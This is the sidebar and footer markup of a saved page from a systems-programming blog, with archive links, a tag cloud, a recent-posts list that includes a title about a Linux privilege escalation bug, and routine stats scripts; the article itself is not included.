	<option value="http://timetobleed.com/2010/06/"> June 2010 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2010/05/"> May 2010 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2010/03/"> March 2010 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2010/02/"> February 2010 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2010/01/"> January 2010 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/12/"> December 2009 &nbsp;(4)</option>
	<option value="http://timetobleed.com/2009/11/"> November 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/10/"> October 2009 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2009/08/"> August 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/07/"> July 2009 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2009/06/"> June 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/05/"> May 2009 &nbsp;(2)</option>
	<option value="http://timetobleed.com/2009/04/"> April 2009 &nbsp;(4)</option>
	<option value="http://timetobleed.com/2009/03/"> March 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/02/"> February 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2009/01/"> January 2009 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2008/11/"> November 2008 &nbsp;(1)</option>
	<option value="http://timetobleed.com/2008/10/"> October 2008 &nbsp;(4)</option>
	<option value="http://timetobleed.com/2008/09/"> September 2008 &nbsp;(1)</option>
 </select>
<form role="search" method="get" id="searchform" action="http://timetobleed.com/">
	<div><label class="screen-reader-text" for="s">Search for:</label>
	<input type="text" value="" name="s" id="s">
	<input type="submit" id="searchsubmit" value="Search">
	</div>
	</form><h3>Pages</h3>		<ul>
			<li class="page_item page-item-2"><a href="http://timetobleed.com/about/">Why is it time to bleed?</a></li>
<li class="page_item page-item-12"><a href="http://timetobleed.com/about-me/">About me</a></li>
<li class="page_item page-item-1605"><a href="http://timetobleed.com/slides-from-mwrc-2010/">Slides from MWRC 2010</a></li>
		</ul>
		<h3>Posts with patches</h3>			<div class="textwidget"><a href="http://timetobleed.com/extending-ltrace-to-make-your-rubypythonperlphp-apps-faster/">Extending ltrace to make your Ruby/Python/Perl/PHP apps faster</a><br>
<a href="http://timetobleed.com/fixing-threads-in-ruby-18-a-2-10x-performance-boost/">Fixing Threads in Ruby 1.8: A 2-10x performance boost</a><br><a href="http://timetobleed.com/fix-a-bug-in-rubys-configurein-and-get-a-30-performance-boost/">Fix a bug in Ruby’s configure.in and get a ~30% performance boost.</a><br>
<a href="http://timetobleed.com/6-line-eventmachine-bugfix-2x-faster-gc-1300-requestssec/">6 Line EventMachine Bugfix = 2x faster GC, +1300% requests/sec</a><br>
<a href="http://timetobleed.com/fibers-implemented-for-ruby-1867/">Fibers for Ruby 1.8.6 and 1.8.7</a><br>
<a href="http://timetobleed.com/plugging-ruby-memory-leaks-heapstack-dump-patches-to-help-take-out-the-trash/">Ruby heap/stack dumper</a><br>
<a href="http://timetobleed.com/?p=39"> Ruby threading bugfix</a></div>
		<h3>Other cool blogs</h3>			<div class="textwidget"><a href="http://20bits.com/" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;20bits.com&#39;]);">20bits</a><br>
<a href="http://srtsolutions.com/blogs/marinafedner/default.aspx" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;srtsolutions.com&#39;]);">Lazy Evaluation</a><br>
<a href="http://jakedouglas.net/" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;jakedouglas.net&#39;]);">Jake Douglas: Code, cash &amp; bicycles</a><br>
<a href="http://coderrr.wordpress.com/" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;coderrr.wordpress.com&#39;]);">coderrr</a><br>
<a href="http://zellunit.com/" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-widget&#39;,&#39;zellunit.com&#39;]);">z on life</a></div>
						<h3>Recent Posts</h3>		<ul>
					<li>
				<a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/" title="A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)">A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)</a>
						</li>
					<li>
				<a href="http://timetobleed.com/digging-out-the-craziest-bug-you-never-heard-about-from-2008-a-linux-threading-regression/" title="Digging out the craziest bug you never heard about from 2008: a linux threading regression">Digging out the craziest bug you never heard about from 2008: a linux threading regression</a>
						</li>
					<li>
				<a href="http://timetobleed.com/realtalk-io-an-podcast-for-technical-discussion/" title="realtalk.io: an podcast for technical discussion">realtalk.io: an podcast for technical discussion</a>
						</li>
					<li>
				<a href="http://timetobleed.com/notes-about-an-odd-esoteric-yet-incredibly-useful-library-libthread_db/" title="Notes about an odd, esoteric, yet incredibly useful library: libthread_db">Notes about an odd, esoteric, yet incredibly useful library: libthread_db</a>
						</li>
					<li>
				<a href="http://timetobleed.com/how-a-crazy-gnu-assembler-macro-helps-you-debug-grub-with-gdb/" title="How a crazy GNU assembler macro helps you debug GRUB with GDB">How a crazy GNU assembler macro helps you debug GRUB with GDB</a>
						</li>
				</ul>
		<h3>Tags</h3><div class="tagcloud"><a href="http://timetobleed.com/tag/allocator/" class="tag-link-37" title="2 topics" style="font-size: 10.048780487805pt;">allocator</a>
<a href="http://timetobleed.com/tag/bios/" class="tag-link-49" title="2 topics" style="font-size: 10.048780487805pt;">BIOS</a>
<a href="http://timetobleed.com/tag/bugfix/" class="tag-link-10" title="6 topics" style="font-size: 14.260162601626pt;">bugfix</a>
<a href="http://timetobleed.com/tag/debug/" class="tag-link-7" title="17 topics" style="font-size: 18.926829268293pt;">debug</a>
<a href="http://timetobleed.com/tag/elf/" class="tag-link-54" title="2 topics" style="font-size: 10.048780487805pt;">elf</a>
<a href="http://timetobleed.com/tag/failure-recovery/" class="tag-link-24" title="1 topic" style="font-size: 8pt;">failure recovery</a>
<a href="http://timetobleed.com/tag/fibers/" class="tag-link-28" title="3 topics" style="font-size: 11.414634146341pt;">fibers</a>
<a href="http://timetobleed.com/tag/garbage-collection/" class="tag-link-20" title="9 topics" style="font-size: 15.967479674797pt;">garbage collection</a>
<a href="http://timetobleed.com/tag/gc/" class="tag-link-17" title="9 topics" style="font-size: 15.967479674797pt;">GC</a>
<a href="http://timetobleed.com/tag/kernel/" class="tag-link-16" title="10 topics" style="font-size: 16.422764227642pt;">kernel</a>
<a href="http://timetobleed.com/tag/latency/" class="tag-link-12" title="1 topic" style="font-size: 8pt;">latency</a>
<a href="http://timetobleed.com/tag/linux/" class="tag-link-5" title="27 topics" style="font-size: 21.089430894309pt;">linux</a>
<a href="http://timetobleed.com/tag/ltrace/" class="tag-link-52" title="3 topics" style="font-size: 11.414634146341pt;">ltrace</a>
<a href="http://timetobleed.com/tag/mach-o/" class="tag-link-55" title="2 topics" style="font-size: 10.048780487805pt;">mach-o</a>
<a href="http://timetobleed.com/tag/malloc/" class="tag-link-36" title="1 topic" style="font-size: 8pt;">malloc</a>
<a href="http://timetobleed.com/tag/memory/" class="tag-link-18" title="12 topics" style="font-size: 17.219512195122pt;">memory</a>
<a href="http://timetobleed.com/tag/monitoring/" class="tag-link-22" title="6 topics" style="font-size: 14.260162601626pt;">monitoring</a>
<a href="http://timetobleed.com/tag/mysql/" class="tag-link-39" title="1 topic" style="font-size: 8pt;">mysql</a>
<a href="http://timetobleed.com/tag/networking/" class="tag-link-21" title="1 topic" style="font-size: 8pt;">networking</a>
<a href="http://timetobleed.com/tag/package-management/" class="tag-link-45" title="1 topic" style="font-size: 8pt;">package management</a>
<a href="http://timetobleed.com/tag/patch/" class="tag-link-11" title="6 topics" style="font-size: 14.260162601626pt;">patch</a>
<a href="http://timetobleed.com/tag/patches/" class="tag-link-46" title="4 topics" style="font-size: 12.552845528455pt;">patches</a>
<a href="http://timetobleed.com/tag/performance/" class="tag-link-13" title="17 topics" style="font-size: 18.926829268293pt;">performance</a>
<a href="http://timetobleed.com/tag/privilege-escalation/" class="tag-link-44" title="2 topics" style="font-size: 10.048780487805pt;">privilege escalation</a>
<a href="http://timetobleed.com/tag/privileges/" class="tag-link-43" title="2 topics" style="font-size: 10.048780487805pt;">privileges</a>
<a href="http://timetobleed.com/tag/profiling/" class="tag-link-19" title="12 topics" style="font-size: 17.219512195122pt;">profiling</a>
<a href="http://timetobleed.com/tag/python/" class="tag-link-51" title="1 topic" style="font-size: 8pt;">python</a>
<a href="http://timetobleed.com/tag/raid/" class="tag-link-23" title="1 topic" style="font-size: 8pt;">RAID</a>
<a href="http://timetobleed.com/tag/ruby/" class="tag-link-9" title="17 topics" style="font-size: 18.926829268293pt;">ruby</a>
<a href="http://timetobleed.com/tag/ruby-hoedown/" class="tag-link-50" title="1 topic" style="font-size: 8pt;">ruby hoedown</a>
<a href="http://timetobleed.com/tag/scaling/" class="tag-link-14" title="15 topics" style="font-size: 18.243902439024pt;">scaling</a>
<a href="http://timetobleed.com/tag/security/" class="tag-link-41" title="4 topics" style="font-size: 12.552845528455pt;">security</a>
<a href="http://timetobleed.com/tag/signal-handling/" class="tag-link-48" title="1 topic" style="font-size: 8pt;">signal handling</a>
<a href="http://timetobleed.com/tag/storage/" class="tag-link-25" title="1 topic" style="font-size: 8pt;">storage</a>
<a href="http://timetobleed.com/tag/strace/" class="tag-link-4" title="5 topics" style="font-size: 13.463414634146pt;">strace</a>
<a href="http://timetobleed.com/tag/synchronization/" class="tag-link-40" title="1 topic" style="font-size: 8pt;">synchronization</a>
<a href="http://timetobleed.com/tag/syscall/" class="tag-link-6" title="7 topics" style="font-size: 14.829268292683pt;">syscall</a>
<a href="http://timetobleed.com/tag/system-health/" class="tag-link-26" title="7 topics" style="font-size: 14.829268292683pt;">system health</a>
<a href="http://timetobleed.com/tag/systems/" class="tag-link-8" title="33 topics" style="font-size: 22pt;">systems</a>
<a href="http://timetobleed.com/tag/testing/" class="tag-link-34" title="1 topic" style="font-size: 8pt;">testing</a>
<a href="http://timetobleed.com/tag/threading/" class="tag-link-27" title="6 topics" style="font-size: 14.260162601626pt;">threading</a>
<a href="http://timetobleed.com/tag/threads/" class="tag-link-15" title="6 topics" style="font-size: 14.260162601626pt;">threads</a>
<a href="http://timetobleed.com/tag/vulnerability/" class="tag-link-42" title="4 topics" style="font-size: 12.552845528455pt;">vulnerability</a>
<a href="http://timetobleed.com/tag/x86/" class="tag-link-38" title="12 topics" style="font-size: 17.219512195122pt;">x86</a>
<a href="http://timetobleed.com/tag/x86_64/" class="tag-link-47" title="17 topics" style="font-size: 18.926829268293pt;">x86_64</a></div>


</div>

	<script type="text/javascript">
		window.onload = function(){prettyPrint();};
	</script>
</div>

<div id="footer">
	<p>The Journalist template by <a href="http://lucianmarin.com/" rel="designer">Lucian E. Marin</a> — Built for <a href="http://wordpress.org/">WordPress</a></p>
</div>
<!--stats_footer_test--><script src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/e-201322.js.下載" type="text/javascript"></script>
<script type="text/javascript">
st_go({blog:'5047892',v:'ext',post:'2470'});
var load_cmc = function(){linktracker_init(5047892,2470,2);};
if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
else load_cmc();
</script>



<!-- Dynamic page generated in 0.342 seconds. -->
<!-- Cached page generated by WP-Super-Cache on 2013-05-26 22:20:25 -->

<!-- Compression = gzip --><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/g.gif" alt="" width="6" height="5" id="wpstats"></body></html>